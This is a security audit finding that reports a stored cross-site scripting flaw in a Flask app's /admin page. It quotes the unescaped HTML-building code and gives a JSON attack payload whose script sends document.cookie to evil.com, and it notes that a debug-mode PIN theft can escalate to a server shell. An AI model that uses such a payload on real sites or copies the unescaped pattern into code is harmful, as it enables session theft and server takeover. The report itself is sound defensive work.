# [C008] Stored XSS — `POST /events` → `GET /admin`

**Severity:** Critical
**CWE:** CWE-79
**File:** `backend/app.py`

---

## Description

The `/admin` route builds raw HTML by string-concatenating `e['title']` and `e['description']` with no escaping. Any user who creates an event via the unauthenticated `POST /events` endpoint can plant a script payload that executes in every admin session. This is a **stored XSS** — the payload is saved in the database and fires persistently.

## Vulnerable code

```python
for e in events:
    html += (
        f"<div class='event'>"
        f"<h3>{e['title']}</h3>"       # ← unescaped
        f"<p>{e['description']}</p>"   # ← unescaped
        f"</div>"
    )
```

## Attack payload — `POST /events` body

```json
{
  "title": "<script>fetch('https://evil.com/?c='+document.cookie)</script>",
  "date": "2026-01-01T00:00:00"
}
```

Every browser that visits `/admin` after this event is created will execute the script. Because `debug=True` is also enabled, the attacker can use the XSS to steal the Werkzeug PIN and gain a full interactive Python shell on the server (RCE).
